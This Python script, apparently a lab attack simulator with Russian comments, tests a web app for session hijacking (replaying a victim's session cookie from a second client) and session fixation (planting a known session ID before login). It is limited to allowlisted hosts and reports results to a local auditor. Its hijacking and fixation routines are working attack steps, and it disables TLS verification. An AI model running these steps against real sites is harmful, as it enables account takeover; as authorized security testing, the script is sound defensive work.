"""Authorized localhost/allowlisted session security tests only."""

import argparse
import os
import re
import sqlite3
from pathlib import Path
from urllib.parse import urlparse

import requests
from dotenv import load_dotenv

load_dotenv()

PROJECT_ROOT = Path(__file__).resolve().parents[1]

MITMPROXY_HOST = os.getenv(
    "MITMPROXY_HOST",
    "127.0.0.1",
)

MITMPROXY_PORT = os.getenv(
    "MITMPROXY_PORT",
    "443",
)

MITMPROXY_BASE_URL = (
    f"https://{MITMPROXY_HOST}:{MITMPROXY_PORT}"
)

# CA для attack_simulator -> Auditor :5000
AUDITOR_CA_CERT = os.getenv(
    "MITMPROXY_UPSTREAM_CA",
    str(PROJECT_ROOT / "certs" / "mkcert-rootCA.pem"),
)

CA_CERT_PATH = Path(AUDITOR_CA_CERT)

if not CA_CERT_PATH.is_absolute():
    CA_CERT_PATH = PROJECT_ROOT / CA_CERT_PATH

CA_CERT_PATH = CA_CERT_PATH.resolve()

AUDITOR_ATTACK_RESULTS_API_URL = os.getenv(
    "AUDITOR_ATTACK_RESULTS_API_URL",
)

ATTACK_SIMULATOR_API_KEY = os.getenv(
    "ATTACK_SIMULATOR_API_KEY",
    "",
)


def allowed(url):
    """Разрешаем тестирование только явно разрешённых хостов."""
    host = urlparse(url).hostname

    allowed_hosts = {
        x.strip()
        for x in os.getenv(
            "ALLOWED_TEST_HOSTS",
            ""
        ).split(",")
        if x.strip()
    }

    return host in allowed_hosts


def save(kind, target, success, details):
    """Сохраняем результат теста в SQLite."""
    path = os.getenv(
        "DATABASE_PATH",
        "instance/security.db"
    )

    con = sqlite3.connect(path)

    con.execute(
        """
        INSERT INTO attack_tests(
            attack_type,
            target,
            success,
            details
        )
        VALUES (?, ?, ?, ?)
        """,
        (
            kind,
            target,
            int(success),
            details
        )
    )

    con.commit()
    con.close()

def report_to_auditor(kind, target, success, details):
    """
    Передаём результат активного теста в Token Security Auditor.
    """
    if not ATTACK_SIMULATOR_API_KEY:
        return False, "ATTACK_SIMULATOR_API_KEY не задан"

    payload = {
        "attack_type": kind,
        "target": target,
        "success": bool(success),
        "details": details,
    }

    try:
        response = requests.post(
            AUDITOR_ATTACK_RESULTS_API_URL,
            json=payload,
            headers={
                "X-API-Key": ATTACK_SIMULATOR_API_KEY,
            },
            timeout=5,
            verify=str(CA_CERT_PATH),
        )

        if response.status_code not in (200, 201):
            return False, (
                f"Auditor API HTTP {response.status_code}: "
                f"{response.text[:200]}"
            )

        return True, "Результат передан в Auditor"

    except Exception as exc: # noqa: BLE001
        return False, f"Auditor API недоступен: {exc}"

def create_session():
    """Создаёт session для обращения к локальному mitmproxy."""
    session = requests.Session()
    session.verify = False
    return session

def get_csrf_token(session_obj, base):
    """
    Получаем страницу /login и извлекаем csrf_token
    из скрытого HTML-поля.
    """

    response = session_obj.get(
        base + "/login",
        timeout=10
    )

    if response.status_code != 200:
        raise RuntimeError(
            f"Failed to open /login. "
            f"HTTP {response.status_code}"
        )

    # Вариант:
    # <input id="csrf_token" name="csrf_token"
    #        type="hidden" value="...">

    patterns = [
        r'name=["\']csrf_token["\'][^>]*value=["\']([^"\']+)["\']',
        r'value=["\']([^"\']+)["\'][^>]*name=["\']csrf_token["\']',
    ]

    for pattern in patterns:
        match = re.search(
            pattern,
            response.text,
            re.IGNORECASE
        )

        if match:
            return match.group(1)

    raise RuntimeError(
        "CSRF token was not found on /login"
    )


def get_cookie_safe(session_obj, cookie_name):
    """
    Безопасно получает cookie даже если cookies с таким именем несколько.
    Возвращает последнюю найденную.
    """
    matches = []

    for cookie in session_obj.cookies:
        if cookie.name == cookie_name:
            matches.append(cookie.value)

    if matches:
        return matches[-1]

    return None


def get_session_id(session_obj):
    """
    Получаем идентификатор сессии.

    Поддерживаем как реальное имя cookie приложения,
    так и лабораторный LAB_SESSION_ID.
    """

    for cookie_name in (
        "APP_SESSION_ID",
        "LAB_SESSION_ID",
        "session",
    ):
        sid = get_cookie_safe(
            session_obj,
            cookie_name
        )

        if sid:
            return cookie_name, sid

    return None, None

def login(session_obj, base, username, password):
    """Выполняем корректный вход с CSRF-токеном."""

    csrf_token = get_csrf_token(
        session_obj,
        base
    )

    response = session_obj.post(
        base + "/login",
        data={
            "username": username,
            "password": password,
            "csrf_token": csrf_token,
        },
        allow_redirects=False,
        timeout=10,
    )

    return response


def hijack(base, username, password):
    """
    Лабораторная проверка повторного использования
    идентификатора сессии.
    """

    victim = create_session()

    login_response = login(
        victim,
        base,
        username,
        password
    )

    if login_response.status_code not in (200, 302, 303):
        return (
            False,
            f"Login failed. HTTP {login_response.status_code}",
        )

    cookie_name, sid = get_session_id(victim)

    if not sid:
        return (
            False,
            "No session ID was received after login"
        )

    attacker = create_session()

    # Имитируем другой клиент.
    attacker.headers.update({
        "User-Agent": "SessionHijack-Lab/1.0"
    })

    attacker.cookies.set(
        cookie_name,
        sid
    )

    response = attacker.get(
        base + "/dashboard",
        allow_redirects=False,
        timeout=10,
    )

    hijack_success = response.status_code == 200

    if hijack_success:
        details = (
            "Reusing the session ID allowed access to /dashboard. "
            f"Cookie={cookie_name}; "
            f"HTTP {response.status_code}. "
            "Potential Session Hijacking vulnerability."
        )
    else:
        details = (
            "Reusing the session ID did not allow access to the protected page. "
            f"Cookie={cookie_name}; "
            f"HTTP {response.status_code}."
        )

    return hijack_success, details


def fixation(base, username, password):
    target = f"{base.rstrip('/')}/unsafe/fixation-login"

    if not allowed(target):
        raise RuntimeError(f"Target host is not allowed: {target}")

    attacker_sid = "attacker-fixed-id"

    session = create_session()
    session.headers.update({
        "User-Agent": "SessionFixation-Lab/1.0"
    })

    # Шаг 1. Атакующий заранее фиксирует известный ему session ID.
    target_host = urlparse(target).hostname

    session.cookies.set(
        "LAB_SESSION_ID",
        attacker_sid,
        domain=target_host,
        path="/",
    )

    try:
        # Шаг 2. Получаем страницу логина и CSRF-токен.
        session.get(
            target,
            timeout=5,
        )

        csrf_token = "lab-csrf-token"

        # Шаг 3. Авторизация жертвы с уже известным SID.
        post_response = session.post(
            target,
            data={
                "username": username,
                "password": password,
                "csrf_token": csrf_token,
            },
            timeout=5,
        )

        # Шаг 4. Проверяем, изменился ли SID после авторизации.
        cookie_name, session_sid = get_session_id(session)

        vulnerable = (
            post_response.status_code == 200
            and cookie_name == "LAB_SESSION_ID"
            and session_sid == attacker_sid
        )

        if vulnerable:
            details = (
                f"Session ID was fixed before authentication: "
                f"{attacker_sid}. "
                f"The server retained the same SID after authentication: "
                f"{session_sid}. "
                f"HTTP {post_response.status_code}. "
                f"Potential Session Fixation vulnerability."
            )
        else:
            details = (
                f"Session ID before authentication: {attacker_sid}. "
                f"Session ID after authentication: {session_sid}. "
                f"HTTP {post_response.status_code}. "
                f"The SID was changed or authentication failed."
            )

        return vulnerable, details

    except Exception as exc: # noqa: BLE001
        details = f"Session Fixation test error: {exc}"

        return False, details

def main():
    parser = argparse.ArgumentParser(
        description=(
            "Check Session Hijacking "
            "and Session Fixation"
        )
    )

    parser.add_argument(
        "attack",
        choices=[
            "hijacking",
            "fixation",
        ]
    )

    parser.add_argument(
        "--base",
        default=os.getenv(
            "ATTACK_TARGET_URL",
            MITMPROXY_BASE_URL,
        ),
    )

    parser.add_argument(
        "--username",
        required=True
    )

    parser.add_argument(
        "--password",
        required=True
    )

    args = parser.parse_args()

    if not allowed(args.base):
        raise SystemExit(
            "Target blocked: add only allowed "
            "test host in ALLOWED_TEST_HOSTS"
        )

    if args.attack == "hijacking":
        ok, details = hijack(
            args.base,
            args.username,
            args.password
        )
    else:
        ok, details = fixation(
            args.base,
            args.username,
            args.password
        )

    save(args.attack, args.base, ok, details)

    _, report_details = report_to_auditor(
        args.attack,
        args.base,
        ok,
        details,
    )

    print()

    print()
    print("=" * 60)
    print("TEST RESULT")
    print("=" * 60)
    print(f"Attack:       {args.attack}")
    print(f"Target:        {args.base}")
    print(f"Success:  {ok}")
    print(f"Details:    {details}")
    print(f"Auditor:     {report_details}")
    print("=" * 60)


if __name__ == "__main__":
    main()